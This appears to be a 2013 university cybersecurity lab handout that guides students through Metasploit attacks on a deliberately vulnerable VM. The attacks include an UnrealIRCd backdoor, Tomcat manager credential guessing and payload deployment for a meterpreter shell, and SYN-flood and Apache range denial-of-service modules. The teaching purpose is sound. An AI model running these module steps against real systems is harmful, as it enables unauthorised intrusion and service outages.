    <h1>Metasploit<span class="sln"> - Solution</span></h1>
	<h2>EC 521 Cybersecurity, Fall 2013, Lab 6</h2>
	
	<div class="lab">
    <p>This lab should be performed in groups of two students. 
    Solutions should be submitted electronically via Blackboard Learn.</p>
    
    <p><a href="http://www.metasploit.com/">Metasploit</a> is a framework 
    made to take advantage of known exploits discovered over the years. 
    This framework helps verify new exploits (by automating the process 
    of triggering and taking advantage of a newly discovered security issue) 
    and can also be used to assess the security of a given network or host. 
    The Metasploitable VM we use in our experiments contains many processes 
    with known security issues that can be found and exploited using 
    Metasploit's various modules.</p>
    
	<p>The goal of this lab is to become familiar with the Metasploit 
    framework and its features. You will explore several exploit modules 
    and their settings. You will then examine the actions of these exploits
    and see how a security issue can be leveraged to gain remote access 
    to a target machine without much effort.</p>
    
    <h2>Setup</h2>
    <ol>
        <li>Start both virtual machines and log in to Kali and Metasploitable.</li>
        <li>Find out IP addresses of both machines and verify connectivity from Kali to Metasploitable by pinging.</li>
        <li>Run Metasploit on Kali by typing <kbd>msfconsole</kbd> into a terminal.</li>

<h2 style="counter-reset: chapter">Using Metasploit to compromise remote systems</h2>
<h3>Exploiting the Unreal IRC Daemon</h3>
    <p>Metasploitable is running many vulnerable services. The first process you will exploit is an Unreal IRC daemon (unrealircd) running on a certain port. The version of this daemon supplied on Metasploitable contains a backdoor that is triggered by sending the letters &quot;AB&quot; following a system command to the server on any listening port. Metasploit has a module that exploits this.</p>
<ol>
        <li> Type <kbd>use exploit/unix/irc/unreal_ircd_3281_backdoor</kbd> (hint: tab auto-completion is supported)</li>
        <li>This exploit has several options. See the list by typing <kbd>show options</kbd>.</li>
        <li>You can set (or change) options by typing <kbd>set [option name] [value]</kbd>.</li>
        <q>Which port does this exploit target?</q>
        <li>Set the target address to IP address of Metasploitable.</li>
        <li>Run the module by typing <kbd>exploit</kbd>. You should have gained access to the machine,  there will be no shell prompt but it will accept and respond to shell commands.</li>
        <li>Answer the following questions using the appropriate Linux/shell commands.</li>
        <q>Which user and group are you now running as?</q>
        <q>What is your current directory?</q>
        <q>What is the hostname of the machine you're running on?</q>
        <q>Submit a screenshot showing the answers to the previous 3 questions.</q>
        <li>Exit the remote session by pressing <kbd>Ctrl+C</kbd> and typing <kbd>Y</kbd>.</li>
        <li>Change the RPORT variable to 8180 and try the exploit again.</li>
        <q>Did the exploit work this time as well? Explain.</q>
    </ol>

    <h3>Exploiting Tomcat</h3>
<p>To explore the common features and differences of Metasploit modules, we will now obtain access to the Metasploitable VM through an exploit in Tomcat 5.5, a vulnerable Java-based web-server running on port 8180 on the VM.</p>
    <ol>
    	<li>Use the Metasploit's built-in search feature to determine which modules can potentially be used against Tomcat.</li>
        <q>How many modules are usable against Tomcat?</q>
    	<li>Use the <tt>info</tt> command to get more information on the <tt>tomcat_mgr_login</tt> module.</li>
        <q>Which vulnerability does this module use to get valid user names and passwords?</q>
        <li>Switch to (&quot;use&quot;) the <tt>tomcat_mgr_login</tt> module in Metasploit.</li>
        <li>Configure RHOSTS and RPORT.</li>
        <li>Set STOP_ON_SUCCESS  to true.</li>
        <li>Run the module.</li>
        <q>What username and password  can be used to log into Tomcat's Application Manager?</q>
        <li>Now that we have access to Tomcat's &quot;Manager&quot; Application, 
        we can use <tt>tomcat_mgr_deploy</tt> on it to deploy a payload of our choice. 
        This time, we want to get a shell on the target machine.</li>
        <li>Use the <tt>exploit/multi/http/tomcat_mgr_deploy</tt> exploit module. </li>
        <li>Configure RHOST and RPORT.</li>
        <li>Set USERNAME and PASSWORD to values found by <tt>tomcat_mgr_login</tt>.</li>
        <li>Use <kbd>show payloads</kbd> to list the payloads that the exploit can deliver.</li>
        <li>Pick the <tt>java/meterpreter/bind_tcp</tt> payload by setting the PAYLOAD option.</li>
        <li>Now run the exploit using the <kbd>exploit</kbd> command. </li>
        <li>You should now be in a meterpreter shell on the target system. Since this is a Java based exploit,  it is limited in the commands it can successfully execute.</li>
        <li>Type <kbd>pwd</kbd> to see the current working directory. </li>
        <li>Now type <kbd>shell</kbd> to gain shell access of the target machine.
            Using the shell you can execute arbitrary commands on the Metasploitable VM to gather information or to launch further attacks.</li>
        <q>Submit a screenshot of output of <kbd>hostname</kbd> running in a shell on the target machine.</q>
        <li>Use Ctrl+C to leave the shell session.</li>
    </ol>    
    
	<h2>Using Metasploit to mount network attacks</h2>
    
<h3>Denial of Service with a Flood Attack</h3>
	<ol>
    	<li>In a Kali terminal, type <kbd>msfconsole</kbd> to open Metasploit.</li>
    	<li>Select the synflood module: <kbd>use auxiliary/dos/tcp/synflood</kbd></li>
    	<li>Configure remote host and port with  <kbd>set RHOST [Metasploitable IP]</kbd>
        followed by <kbd>set RPORT 8180</kbd>.</li>
    	<li>Since we want to observe the attack first, start with a low number of packets: <kbd>set NUM 20</kbd>.</li>
    	<li>Open <em>Wireshark</em> and start capturing.</li>
    	<li>In the Metasploit console, type <kbd>exploit</kbd> to start the attack.</li>
    	<li>After a short while, look at the captured data.</li>
        <q>What are your observations on the IP addresses and ports of generated packets?
        Do you see any reason for this behavior?</q>
        <li>Run <kbd>top</kbd> on Metasploitable to observe CPU and memory usage while idle.</li>
        <li>in Metasploit console, type <kbd>unset NUM</kbd> so that the host will send an unlimited number of packets. Start the attack.</li>
        <li>Compare the output of <tt>top</tt> while the attack is in progress to idle values you recorded earlier.</li>
    </ol>
    <q>Is this attack effective? Why/why not?</q>
    <q>Which processes are affected by the attack and why?</q>
    <q>Submit a screenshot/console grab of <tt>top</tt> output on Metasploitable while attack is in progress.</q>
	<p>Don't forget to stop the attack once you're done.</p>
	   
    <h3><em>Apache</em> Range DoS Attack</h3>
<p>In this section, we will use a Metasploit module called apache_range_dos to conduct a flood attack using specially crafted packets targeting a vulnerable version of Apache web (HTTP) server running on the Metasploitable VM.</p>
<p>Open up a web browser on Kali (iceweasel will do) and go to Metasploitable's IP address (http://[ip address]/). Click on <em>Mutillidae</em>, then on <em>Login/register</em>, and record how much time does it usually take for the login page to load. Then return to the Home page.</p>
<ol>
    <li>As in the previous section, run <kbd>top</kbd> on Metasploitable to observe the machine's load.</li>
    <li>In Metasploit console on Kali, choose the <kbd>auxiliary/dos/http/apache_range_dos</kbd> module.</li>
    <li>Set <tt>RHOST</tt> to victim's IP.</li>
    <li>Set <tt>RLIMIT</tt> to 10000.</li>
    <li>Run Wireshark and start capturing.</li>
    <li>Type <kbd>exploit</kbd> in Metasploit console to start the attack.</li>
    <li>After a few seconds, stop the Wireshark capture but keep the attack going.</li>
    <q>While the attack is ongoing, try accessing the Login page of Mutillidae again from a web browser. What is the difference in response time?</q>
    <q>Consider the output of <tt>top</tt> on Metasploitable and the response time you have measured in the previous question. What is the resulting CPU load on the target machine? Is the attack effective?</q>
        <q>Which processes are affected by the attack and why?</q>
    <li>Stop the attack.</li>
</ol>
	
	<p>Examine the Wireshark capture of the beginning of the attack.</p>
	<q>What protocol is used in this attack?</q>
	<q>What kind of flags do the packets carry? What can you observe about the contents of the packets?</q>
    <q>Suggest a few possible ways to modify the Apache server that can prevent this kind of attack or mitigate its effects.</q>
